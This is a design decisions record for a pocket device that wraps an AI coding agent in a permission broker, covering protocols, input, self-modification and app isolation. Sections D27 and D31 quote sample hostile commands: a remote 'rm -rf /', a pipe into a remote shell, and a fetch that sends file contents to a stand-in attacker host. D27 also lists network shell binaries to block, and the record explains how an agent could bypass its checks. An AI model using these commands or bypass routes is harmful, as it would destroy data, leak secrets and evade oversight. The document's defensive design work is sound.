# Decisions

Architectural decisions for Nomad, newest section last. Each records what was
decided, why, and what it would cost to change. This file is the contract other
documents and modules are written against — if code and this file disagree, one
of them is a bug.

Status values: **Accepted**, **Superseded by Dxx**, **Provisional** (decided, but
we expect to revisit before 1.0).

---

## D1 — Async-first, single event loop

**Accepted.** Everything long-lived is `async`. One asyncio loop owns the process.
Blocking work — serial reads, camera capture, SQLite, llama.cpp inference — is
pushed to `asyncio.to_thread` or a dedicated worker, never run on the loop.

*Why:* The Pi 4 has four weak cores and the workload is almost entirely IO-bound
device chatter. Threads-per-device would cost more in context switching and locks
than it buys.

*Cost to change:* **High.** The sync/async split is visible in every interface.

---

## D2 — Codec is separate from Transport

**Accepted.** `Transport` moves `bytes` and knows nothing about message meaning.
`Codec` turns a `Message` into bytes and back. `Framing` handles byte-stream
delimiting. Three separate concerns, three separate objects.

*Why:* JSON over USB CDC is the right starting point and the wrong ending point.
When the display protocol needs binary framebuffer deltas, or the link needs
CBOR to save bandwidth, we swap the codec and no device driver changes.

*Cost to change:* **High if skipped.** Free now. This is the single cheapest
future-proofing decision in the system.

---

## D3 — Every frame carries type, id, seq, payload

**Accepted.** Requests and responses correlate on `id`. `seq` is monotonic per
direction and detects loss or an MCU reboot mid-stream.

*Why:* Microcontrollers reboot. USB re-enumerates. Without correlation the Pi
cannot tell a late response from a wrong one, and retry becomes unsafe.

*Cost to change:* High — it is a wire format change on both sides of two links.

---

## D4 — Authorization is a separate object from execution

**Accepted. The most important decision in the system.**

A tool call passes through four stages that are never collapsed into one call:

```
ToolRequest  →  Decision  →  AuthorizationGrant  →  ToolResult
              (broker)      (auto or human)        (executor)
```

`ToolExecutor.run()` accepts a `Grant`, not a request. There is no code path that
executes a tool without one. Auto-approval is a *policy that mints a grant*, not
a shortcut around the pipeline.

*Why:* Every permission system that fuses "decide" and "do" ends up with a
bypass, because someone eventually needs to call the fast path. Keeping the grant
as a real, persisted object means auto-run, session approval, model-judged
approval, and human approval are all the same mechanism with different grant
sources — and every one of them is auditable.

*Cost to change:* **Highest in the system.** Retrofitting authorization into a
fused call is a rewrite of every tool.

---

## D5 — Tools declare risk and permissions; the model never gets a raw shell

**Accepted.** Every tool ships a `ToolSpec` carrying a `Risk` level and a set of
required `Permission`s. The model sees these. Security is structural — it does
not depend on the system prompt asking nicely.

`Risk`: `READ_ONLY`, `MUTATING`, `PRIVILEGED`, `DESTRUCTIVE`, `EXTERNAL_DEVICE`.

Arbitrary command execution exists as a real tool (`run_command`) because
crippling it would defeat the point of a pocket coding agent — but it is
disabled by default in config, and `never_auto` in every mode.

*Cost to change:* High.

---

## D6 — Event bus is in-process, fire-and-forget, error-isolating

**Accepted.** No broker, no Redis. Handler exceptions are caught, logged, and
published as `system.handler_error`; they never propagate to the publisher.
Slow subscribers get a bounded queue and are dropped rather than allowed to
apply backpressure.

*Why:* A stalled WebSocket client must never be able to freeze the display or
the agent loop.

*Cost to change:* Medium.

---

## D7 — SQLite with WAL, explicit integer schema version

**Accepted.** One database, WAL mode, accessed from a single worker thread.
Migrations are numbered Python functions from day one.

*Why:* The agent session must survive power loss; that requires real durability,
and "just delete the database" stops being acceptable the moment there is a
conversation history worth keeping.

*Cost to change:* Medium.

---

## D8 — Layered TOML configuration

**Accepted.** `nomad.toml` (committed defaults) → `nomad.local.toml`
(gitignored, per-device) → `NOMAD_*` environment variables. Parsed into a
Pydantic model, validated at boot, failing loudly.

*Cost to change:* Low.

---

## D9 — Hardware selected by driver string; mock is the default

**Accepted.** `[display] driver = "mock" | "esp32"`. Every device category has a
mock implementing the same protocol. The full system, including tests, runs on a
development laptop with no hardware attached.

*Cost to change:* Low.

---

## D10 — `src/` layout, single installable package

**Accepted.** Prevents accidental imports of the working directory and makes the
installed artifact match what is tested.

*Cost to change:* Low.

---

## D11 — Nomad is a persistent agent session, not a request/response service

**Accepted.**

`AgentSession` is a long-lived component started by `NomadCore` at boot and
running until shutdown. HTTP, WebSocket, and the ESP32 display are *views* onto
it. Closing the screen does not end the session; reconnecting replays recent
state rather than starting a new conversation.

Turn state is persisted **before** execution, so a power cut mid-turn resumes or
aborts cleanly rather than leaving a half-applied edit with no record.

*Why:* "A pocket Claude Code that is always running" is a statement about
lifetime, and lifetime has to be structural. A session owned by a request handler
dies with the request.

*Cost to change:* High — it determines who owns state.

---

## D12 — Tools act on a Target, never on the filesystem directly

**Accepted.**

```python
class Target(Protocol):
    id: str            # "local", "ssh:workstation"
    kind: TargetKind   # LOCAL | SSH | HID
    capabilities: frozenset[Capability]
```

Three target kinds, deliberately not one:

| Kind | Capabilities | Status |
|---|---|---|
| `LOCAL` | filesystem, exec | Implemented |
| `SSH` | filesystem, exec — on an authorized remote host with its own identity | Interface defined, stub raises |
| `HID` | **keyboard/pointer output only** | Interface defined, stub raises |

HID is modelled as a different capability shape on purpose. It has no filesystem
at all, so a file tool cannot be pointed at it even by mistake — the capability
check fails before any permission logic runs.

Permissions are evaluated per `(tool, target)` pair, not per tool. Writing a file
locally and writing one on a production SSH target are different decisions.

*Why:* Retrofitting a target parameter into tools written against a bare
filesystem means rewriting every tool and every permission rule.

*Cost to change:* **High.** This is why it is in the MVP despite SSH and HID
being stubs.

---

## D13 — Input is logical, never physical

**Accepted.** Touchscreen, joystick, four face buttons, browser keys, and any
future device normalize into one `InputEvent` stream before anything consumes
them.

Logical actions: `NAV_UP`, `NAV_DOWN`, `NAV_LEFT`, `NAV_RIGHT`, `CONFIRM`,
`BACK`, `ACTION_1`, `ACTION_2`. Plus `PRESS`/`RELEASE`/`REPEAT` phases, because
games need hold and menus need edge-triggered.

**The action set is extensible, not fixed** (see D26). Core actions are always
present; the system and apps may register additional actions — `ASSISTANT` being
the obvious one. This is what makes "remap B to a dedicated AI button" a typed
settings change rather than a code change.

Physical → logical mapping lives in TOML. **No application code may reference a
GPIO pin, a button index, or a raw key code.** UI and games subscribe to logical
actions only.

*Why:* Two consumers with opposite needs — menus want touch-first, games want
low-latency controller input — must not fork the input path. And the hardware
will change: pin assignments are a wiring detail, not an API.

*Cost to change:* High once games and UI exist. Free now.

---

## D14 — Permission modes, Claude Code shaped

**Accepted.**

Mode is a property of the session, switchable at runtime, persisted.

| Mode | Behaviour |
|---|---|
| `manual` | Every non-read-only action prompts. Approving offers *this once* or *this kind for the session*. |
| `session` | As manual, but session-scoped grants accumulate — approve `write_file` on `local` once and it stops asking. |
| `smart` | The broker asks the model to classify the specific call. Low-risk auto-runs; anything the model flags, or declines to classify confidently, escalates to a prompt. |
| `auto` | Everything auto-runs except `never_auto` actions. |

A **session grant** is keyed on `(tool, target, scope)` — not just the tool name.
Approving `write_file` under the workspace does not approve it outside.

`never_auto` in **every** mode, including `auto`:
- writes or exec outside the workspace root
- any action on an `SSH` target
- any `HID` output
- anything marked `DESTRUCTIVE`

*Why:* Mode is how much you trust the model today; `never_auto` is what the
device is not allowed to do regardless. Conflating them means one careless mode
switch turns a coding assistant into a keystroke injector.

*Cost to change:* Medium — modes are additive, but `never_auto` must be honoured
at the broker, not at the call sites.

---

## D15 — Filesystem tools are confined to a workspace root

**Accepted.** Paths are resolved (symlinks followed) and checked against the
configured workspace root before any IO. Traversal is rejected at the tool layer.

Read-only operations inside the workspace auto-run in all modes. Writes follow
the mode policy. Anything resolving outside the root is `never_auto` and prompts
even in `auto` mode.

*Why:* A prompt-level instruction not to leave the workspace is not a boundary.
A resolved-path check is.

*Cost to change:* Low.

---

## D16 — Context compaction is a core component

**Accepted.** `agent/context.py` owns the token budget and summarize-and-compact.
Compaction records are persisted as durable artifacts, not discarded.

*Why:* A session that runs for days has unbounded history by construction. On a
4 GB Pi this is a correctness and memory concern, not an optimization.

*Cost to change:* Medium.

---

## D17 — Model routing, not model replacement

**Accepted. Provisional on hardware.**

`AIProvider` speaks Nomad's own message types. Adapters translate to vendor
wire formats — the abstraction is not shaped like any one vendor's API.

A `ModelRouter` chooses a provider per turn based on task class, network
availability, and battery state. Planned providers: `mock` (tests), `cloud`
(capable agentic work — the default), `local` (small quantized model for
offline, intent classification, and short answers).

**Explicitly not designed around:** an accelerator replacing the main model.
An Edge TPU or Hailo NPU is a vision accelerator with single-digit megabytes of
on-chip memory; it cannot host a useful language model. Realistic onboard
inference on this hardware is a 1–3B model quantized to Q4 running on the CPU at
a few tokens per second — useful for intent and offline fallback, not for
agentic coding. If onboard agentic work becomes a goal, the answer is more RAM
and a better SBC, not an accelerator stick.

*Cost to change:* Medium. Routing is additive; coupling providers to a vendor
format would not be.

---

## D18 — Battery state is a policy input

**Accepted.** PiSugar readings feed a policy that can defer background work,
prefer the local model, and park the session cleanly before shutdown rather than
dying mid-turn.

*Why:* An always-on device on a battery will hit low power during a turn. The
failure mode has to be a clean park, not a corrupted partial write.

*Cost to change:* Low.

---

## D19 — Claude Code is the agent loop *today*, behind a swappable interface

**Accepted. Supersedes the loop half of D11 and D16. Amended by D24 — read D24
with this one; the backend is an implementation, not the architecture.**

Nomad does not implement its own think→tool→observe loop. It runs **Claude Code
headless** via the Python Agent SDK (`claude-agent-sdk`) and acts as the harness
around it. Claude Code is the *current* backend, reached through the `AgentBackend`
interface in D24 — nothing outside `agent/backends/claude_cli.py` may import the
SDK.

```
Claude Code  ── the loop, the tools, compaction, web search, sub-agents
   │
   ├─ can_use_tool  ──→  Nomad PermissionBroker  ──→  touchscreen approval
   └─ MCP server    ←──  Nomad hardware (display, HID, battery, input, sensors)
```

*Why:* Three separate goals — subscription billing rather than per-token API
cost, coding competence equal to Claude Code, and eventual self-modification —
all resolve the same way. Wrapping the CLI as a plain text-completion endpoint
would capture the billing win and forfeit the competence win, and would put two
permission systems in conflict over the same tool call.

**What this retires:** `agent/loop.py` (turn state machine) and `agent/context.py`
(compaction) — Claude Code does both better. **What it keeps:** the entire
permission pipeline (D4), the target abstraction (D12), and all of `core`.
Nomad's built-in filesystem tools are retired in favour of Claude Code's; Nomad's
MCP tools become *hardware* tools, which Claude Code has no equivalent for.

*Cost to change:* Medium. The SDK boundary is narrow and the permission broker is
independent of it.

---

## D20 — Subscription auth via OAuth token; never `--bare`

**Accepted.**

Authentication uses `claude setup-token` on a trusted machine, with the result
stored on the Pi as `CLAUDE_CODE_OAUTH_TOKEN`. `ANTHROPIC_API_KEY` must be
**unset** in Nomad's service environment, or the CLI bills per-token instead of
against the subscription.

**`--bare` must never be used.** Its documented behaviour is that Anthropic auth
is strictly `ANTHROPIC_API_KEY` or `apiKeyHelper` — *"OAuth and keychain are
never read"*. It would silently defeat the entire reason for this decision.
For launch latency use `--strict-mcp-config` and an explicit
`--setting-sources` instead.

Session identity is an explicit UUID Nomad generates and persists, passed as
`--session-id` and resumed with `--resume <uuid>`. **Not `--continue`**, which
resolves to "most recent conversation in this directory" — ambient state a
long-lived daemon must not depend on.

Output is `--output-format stream-json`, so Nomad receives tool calls, results
and token usage as structured events rather than a final string. The display and
the approval flow both need those events.

*Verified against Claude Code 2.1.224.* Flags are a compatibility surface: pin
the CLI version in config, check it at boot, and log loudly on mismatch.

*Cost to change:* Low, but it is an external contract — treat CLI upgrades as
something to test, not assume.

---

## D21 — Nomad's broker gates every Claude Code tool call

**Accepted. Amends D15.**

Claude Code runs with its **full** built-in toolset and is not confined to the
workspace by `--add-dir`. Every call is routed through `can_use_tool` into
Nomad's `PermissionBroker`, which applies D14 and can escalate to the
touchscreen.

The consequence, stated plainly: **the workspace root stops being a hard wall and
becomes a policy line.** The broker is now the only thing between the model and
the device, so `never_auto` carries weight it did not carry before. It denies,
in every mode including `auto`:

- any HID output (D12) — the keystroke-injection path
- any action on an SSH target
- anything classified `DESTRUCTIVE`
- **writes to Nomad's own running source tree** — these must go through the
  self-update path in D22, never edit the live tree in place

A `can_use_tool` handler that errors, times out, or cannot classify **denies**.
Fail closed, always.

*Why:* Constraining the toolset would produce constant missing-capability
friction and would drift every time Claude Code adds a tool. Gating at the call
site scales and keeps one enforcement point.

*Cost to change:* Low mechanically, high in consequence — this is the decision to
revisit first if the device ever misbehaves.

---

## D24 — The agent backend is swappable; Claude Code is one implementation

**Accepted. This constrains D19.**

The long-term goal is to replace the cloud model with a **locally run LLM reached
over Tailscale**. That is only cheap if nothing above the backend knows which
backend is running.

```python
class AgentBackend(Protocol):
    name: str
    async def start(self) -> None: ...
    async def stop(self) -> None: ...
    async def send(self, text: str, *, session_id: str) -> None: ...
    def events(self) -> AsyncIterator[AgentEvent]: ...   # text, tool_call, usage, error
    async def interrupt(self) -> None: ...
```

Planned implementations:

| Backend | Status | Notes |
|---|---|---|
| `claude_cli` | Current | Claude Code headless via the Agent SDK, subscription auth (D20) |
| `remote_llm` | Planned | An OpenAI/Anthropic-compatible endpoint on a workstation, reached over **Tailscale**. Nomad holds a tailnet address, not a public one. |
| `mock` | Tests | No subprocess, no network |

**Rules that make the swap cheap:**
- `claude-agent-sdk` may be imported in **exactly one module**:
  `agent/backends/claude_cli.py`. A test enforces this.
- Backends emit Nomad's own `AgentEvent` types. No SDK type crosses the boundary.
- The permission bridge (D21) sits **above** the backend, so gating is backend-
  independent. A local model gets policed by the same broker.
- Backend selected by config string, exactly like hardware drivers (D9).

**The honest asymmetry, recorded so it is not a surprise:** Claude Code brings its
own loop, tools, and compaction. A raw local LLM brings none of those, so
`remote_llm` must supply a loop and a tool-execution path of its own — which is
what Nomad's retired `agent/loop.py` did. Retiring it is right for now, but the
`AgentBackend` interface must not assume the backend is agentic. Backends declare
`capabilities: frozenset[BackendCapability]` (`OWN_LOOP`, `OWN_TOOLS`,
`OWN_COMPACTION`), and Nomad supplies what the backend lacks.

*Cost to change:* Low now. **High if D19 is implemented without it** — which is
precisely why this decision exists.

---

## D25 — Self-upgrading means authoring *apps*, not editing core

**Accepted. This is what "self-upgrading" actually means.**

The target user experience:

> "Make a Mario-style game I can play on your screen" → Nomad writes it, puts a
> shortcut on the home screen, and launches it.

That is **capability authoring**, and it must not touch Nomad's own source tree
(D21 forbids it anyway). Apps are self-contained packages under
`var/apps/<app_id>/`, outside the repo:

```
var/apps/brick-blaster/
  manifest.toml     # id, name, version, icon, entry, requires, permissions
  app.py            # entry point
  assets/
```

`AppManifest` declares the logical input actions it consumes (D13), whether it
needs full-screen display, and what permissions it wants. An app that does not
declare a permission cannot use it.

**Registration is gated, not automatic.** A newly authored app is validated
before it appears on the home screen: manifest schema validates, module imports
cleanly, declared entry point exists, and a smoke-launch survives N seconds. Fail
any step and it is quarantined with the error surfaced — never registered.

**Crash isolation:** a crashing app returns the user to the home screen and must
never take Nomad down.

> **Superseded in part by D29.** This decision originally ran apps as supervised
> asyncio tasks in Nomad's own process, with subprocess isolation named as "the
> upgrade path". That was wrong, and not for performance reasons: an app written
> by the model, running in Nomad's process, reaches the whole machine with one
> `import os` and never passes the broker. In-process apps do not weaken D21,
> they delete it. D29 makes the process boundary part of the contract.

Apps consume logical input actions only (D13) and draw through the display
abstraction — never a GPIO pin, never the framebuffer directly. This is why D13
is worth its cost: a self-authored game gets working controller input for free.

*Cost to change:* Medium. The manifest is a contract with every app ever written.

---

## D26 — Nomad can reconfigure itself through a validated settings API

**Accepted.**

The second self-upgrade shape:

> "Remap the B button to be a dedicated AI button."

This is a **config mutation**, not a code change, and it must not be done by
letting the model free-edit `nomad.toml`. A `SettingsService` exposes typed,
validated mutations:

- every change validates against the Pydantic config model before it is written
- every change is persisted to an audit log with before/after and who asked
- `revert(n)` undoes the last n changes
- changes that require a restart are marked as such rather than silently ignored
- writes go to `nomad.local.toml` (D8), never the committed defaults

Input remapping specifically: the logical action set from D13 is **extensible**
rather than fixed. Core actions (`NAV_*`, `CONFIRM`, `BACK`, `ACTION_1`,
`ACTION_2`) are always present; the system and apps may register additional
actions such as `ASSISTANT`. Remapping B to an AI button is then a legal, typed
settings change rather than a special case.

*Why this and not "let it edit the file":* an invalid TOML write bricks the device
on next boot. Validation before write plus a revert path is the difference
between a reconfigurable device and an unbootable one.

*Cost to change:* Low.

---

## D22 — Self-modification is fail-safe by construction

**Accepted. Provisional — implement only after D19 is stable.**

Nomad may add capabilities to itself, but **never by editing its running tree.**

1. Clone/worktree the repo to a scratch path. Edit only there.
2. Run the full test suite in the scratch tree. A red suite ends the attempt.
3. Only on green, fast-forward `main` and request a restart.
4. systemd `Restart=on-failure` plus a boot counter. If the new SHA fails to
   report healthy N times, automatically `git reset --hard` to the
   last-known-good SHA recorded in SQLite, and restart.
5. Every promotion and rollback is an audited event.

*Why:* "Add a capability to yourself" is only safe if a bad edit cannot make the
device unbootable. The test suite is therefore load-bearing infrastructure, not
ceremony — it is the gate that makes self-modification survivable.

*Cost to change:* Low now, high once it has written its first change.

---

## D23 — One setup script is the whole install

**Accepted.** The delivery target: create a GitHub repo, push, clone on the Pi,
run `scripts/setup.sh`, paste an OAuth token. Nothing else.

The script must be idempotent and must: check the Pi's architecture and Python
version, create the venv, install Nomad and the Agent SDK, install the Claude
CLI if absent, initialise the database, workspace and config, install and enable
the systemd unit, and verify the install by starting the service and hitting
`/health`. It fails loudly with a specific remedy rather than half-installing.

*Cost to change:* Low.

---

## D27 — A shell command is classified by where its effects land

**Accepted.** Found by an adversarial review of the shipped chunk-G code, not by
a test.

D12 says tools act on a `Target`, and D21 says anything on an SSH target is
`never_auto`. Both were true of Nomad's own tools, where the request names its
target. Neither was true of the path the model actually takes: Claude Code does
not call an `ssh` *tool*, it calls `Bash("ssh prod 'rm -rf /'")`. Routed on
declared capabilities alone that is a **local** call, so the SSH guarantee was
bypassed on day one — not by an attack, by the ordinary way the tool works.

So `tools/egress.py` classifies an exec-capable tool call by the binaries its
command invokes. Any token whose basename is a remote-execution binary (`ssh`,
`scp`, `rsync`, `mosh`, `nc`, `socat`, `kubectl`, …) routes the call to the SSH
target, which carries `never_auto` and a remote identity rather than the
device's.

Three properties are load-bearing:

- **Every token is scanned**, not just the first: `cat x | ssh host sh` and
  `cd /tmp && ssh host` both reach another machine.
- **A command that will not tokenise is `UNCLASSIFIABLE`, and the bridge
  denies it.** An unbalanced quote is not a reason to guess "local" (D21).
- **A non-string `command` is unclassifiable too.** Routing happens before the
  params model validates, so it must not fall through to local.

The classifier is blunt and over-eager on purpose: a false positive costs a
prompt, a false negative costs an unapproved shell on someone else's machine.

*Note:* this is what keeps the SSH guarantee true **while `Bash` is
`never_auto`**. Any future relaxation of that (a narrow allowlist for innocuous
commands) must consult this classifier first, or it reopens the hole it closed.

*Cost to change:* Low.

---

## D28 — Nomad's identity is appended to Claude Code's prompt, never substituted

**Accepted.**

The goal is "a Claude Code session with a Nomad identity". Until this decision
the second half was simply not implemented: the backend accepted a
`system_prompt` and nothing ever passed one, so the device's brain believed it
was a terminal on a laptop and answered accordingly — walls of prose, for a
320×240 screen and a joystick.

The fix is `NOMAD.md` at the source root, loaded by `agent/identity.py` and sent
as an **append** to the `claude_code` preset. Replacing the preset was the
tempting shape and is the wrong one: that preset is the reason D19 chose this
backend at all, and swapping it for a personality blurb trades competence at the
actual work — the hard thing — for tone, the easy thing.

`NOMAD.md` is **data, not code**: the operator edits it without a release, and
Nomad can read it (reading its own source is allowed; writing is `never_auto`).
It carries three things the model cannot infer — what body it has, how to answer
on a screen a few inches across, and which actions the broker will refuse.

A missing or empty file logs a warning and falls back to a built-in minimum. A
device that boots without a personality must still boot, but silently losing its
identity is exactly the bug this decision fixes, so it must be noisy.

*Cost to change:* Low.

---

## D29 — Self-authored apps run in their own process (supersedes part of D25)

**Accepted.**

D25 said apps run as supervised asyncio tasks, with subprocess isolation as "the
upgrade path if an app ever needs a hard memory boundary". That framing missed
the actual stake. An app under `var/apps/` is **written by the model**, and an
app running inside Nomad's process needs one line — `import os; os.system(...)`
— to reach the whole machine without passing `can_use_tool`. Every guarantee in
D4, D14, D15 and D21 is enforced at the broker, and in-process code is on the
wrong side of it.

So the process boundary is part of the contract from the first app, not an
optimisation:

- An app runs as a **child process** with its own interpreter, and talks to
  Nomad over an IPC channel carrying the same logical vocabulary it would have
  had in-process: logical input actions in (D13), display operations out (D3).
- **An app has no tool access except through that channel**, and everything it
  asks for crosses the broker exactly as a model tool call does. An app's
  declared manifest permissions are a *ceiling* on what it may request, never a
  grant.
- A crashed, wedged or over-budget app is killed by the supervisor and returns
  the operator to the home screen. This was the original crash-isolation
  requirement and it gets easier, not harder, with a real boundary.

The cost is real — IPC, serialisation, slower app start, no shared objects — and
it is worth paying, because the alternative is a permission architecture that a
generated Python file can step around.

*Cost to change:* High once apps exist. This is why it is decided before chunk I
rather than after the first app is written.

---

## D30 — The wire format, ratified (and corrected on contact with code)

**Accepted.** `docs/ARCHITECTURE.md` carried this as an explicit draft, on the
grounds that freezing a wire format on paper before code exists is how you ship
a bad one. That caution paid for itself: implementing it in chunk E1 found the
drafted framing could not recover from the failure it was designed for.

Three corrections to the draft, all now in `src/nomad/protocol/`:

1. **A 2-byte `SYNC` preamble (`a7 5e`), and the CRC32 now covers the `length`
   field as well as the body.** The draft trusted `length` unconditionally. One
   flipped bit in that prefix therefore made the parser skip the wrong number of
   bytes, and *every* subsequent frame was garbage — permanently, on exactly the
   flaky-USB-cable failure mode length-prefixing exists to survive. The invariant
   that has to hold is "a single flipped bit costs one frame, never the link",
   and the draft could not deliver it. Together the two changes collapse both
   corruption cases into one rule: after a checksum failure, never trust
   `length` — scan forward for the next `SYNC`. Cost: two bytes per frame.
2. **Frames are capped** (`max_frame_bytes`, default 65536, per-link
   overridable). Unspecified in the draft, and without it a corrupt length
   prefix is an allocation of hundreds of megabytes on a 4 GB Pi.
3. **The catalogue is keyed by link, not by type string alone.** The draft gave
   `system.status` two different payload shapes on the two links, violating its
   own rule 3 ("never repurpose a `type` string for a different payload shape").
   Mint distinct type strings if a third link ever appears.

Two judgement calls worth knowing about, because neither is measured:

- **Envelope strictness is `extra="ignore"`.** Forbidding unknown fields would
  let one added firmware field kill every frame, which is the opposite of the
  additive-extension rule.
- **A `seq` reset is always read as a reboot**, never as counter wrap. The two
  are undecidable from the wire, and a spurious handshake every ~4×10⁹ frames is
  cheaper than assuming continuity across a real reboot.

**The firmware must be written against the code, not against an older copy of
the doc.** No firmware exists yet, which is why this was the free moment to fix
the format.

Still open, deliberately: `display.draw` cannot travel through JSON — raw pixels
are not JSON, and a 64×64 RGB565 region measures 8192 bytes of payload in an
11055-byte frame, 35% overhead, on a link shared with input. That measurement is
the concrete trigger for swapping in a binary codec, and it is the exact swap D2
was designed to make cheap.

*Cost to change:* High. Envelope or framing changes require both sides in
lockstep; there is no negotiation below the envelope.

---

## D31 — Reading is not transmitting

**Accepted.** Found by the second adversarial review, and it is the same shape
of bug as D27: a rule was enforced on the path nobody takes.

`Risk.READ_ONLY` auto-approves in **every** mode, `manual` included, because a
device that must be asked before it may read a file is unusable. `WebFetch` and
`WebSearch` were classified `READ_ONLY` — accurately, in that they change
nothing on this machine — and they carry no path parameter, so their scope was
`none` and the auto-allow fired.

The consequence, in `manual` mode, with no prompt at any point: read a file
(auto-allowed), then `WebFetch("https://attacker/?d=<what you just read>")`
(auto-allowed). D27 taught the broker to scan *shell commands* for egress
binaries while the device's easiest egress was a first-class tool that never
reached the classifier. `curl` and `wget` were never the risk; they sit behind
`never_auto` `Bash`.

Three changes, and the first is the principle:

1. **`READ_ONLY` describes the effect on *this machine*, not on the world.**
   `Permission.NETWORK` is excluded from the read-only auto-allow. A tool that
   reads local state and a tool that transmits are different risks and were
   sharing one axis.
2. **Outbound calls are scoped by destination**, `net:<host>`, from a new
   `ToolSpec.url_params` — the network analogue of `path_params`. An approved
   fetch of one host is not a grant to reach every host. A URL that will not
   parse yields `net:?` and is **denied**, never given a broad scope.
3. **Outbound requests are `never_auto`**, alongside HID and SSH, for the same
   reason those are: they are effects on the world outside the device, and a
   mode switch must not unlock them. This device sits in a pocket with the
   screen off, the model can read every file on it, and a query string is a
   fine place to put a secret — so `auto` must not mean "and may post them
   anywhere".

The relaxation is **data, not a deleted line**: `[tools].allowed_network_hosts`
lists hosts reachable unattended, matching an entry or any subdomain of it. It
ships **empty**, because a device that trusts somebody else's domain list is
not fail-closed. This is deliberately the same shape as the `CommandPolicy`
planned for `Bash`: narrow, declared, reviewable.

*Cost to change:* Low. *Cost of not having done it:* the device was one tool
call away from silent exfiltration in its most restrictive mode.

---

## D32 — The device asks, and waits for the answer

**Accepted.**

`display_choice` drew a question and returned "asked it". The one interactive
primitive on the device was **write-only**: the model could pose a question and
then had to guess or end the turn. That makes every exchange a monologue — you
speak, it answers, done — which is the difference between a device and an
oracle, and no amount of voice input fixes it.

`input/choice.py` is where the action stream meets the screen, and deliberately
the only place that happens. `InputChoicePrompter.ask()` draws the question,
consumes `PRESS` transitions to move the highlight, returns on `CONFIRM`, and
is the menu half of D13's one-stream design — it simply ignores `REPEAT`, so
holding the stick does not race through the options.

**Every non-answer is a distinct fact**: `CANCELLED` (they saw it and
declined), `TIMED_OUT` (nobody looked — the normal case for a device in a
pocket, not an error), and `NO_OPERATOR` (no input hardware attached, so
retrying can never help). A model told only "no answer" would retry the one
case where retrying is useless.

Until input hardware exists, `NullChoicePrompter` still *draws* the question —
showing it is useful — and reports `NO_OPERATOR` rather than a confirmation the
model would reasonably read as an answer.

*Cost to change:* Low.

---

## Deliberately deferred

Not in the MVP, recorded so nobody assumes they were forgotten:

- **HTTP API authentication.** Binds to localhost initially. Must be solved
  before the API is exposed on a network — tracked in docs/BUILD_LEDGER.md under "Known gaps".
- **Plugin discovery via entry points.** The registry takes explicit
  registration first.
- **Multi-user / multi-session concurrency.** One session per device for now.
- **OTA firmware update** for the ESP32 and RP2040.
- **Encryption at rest** for the SQLite database.
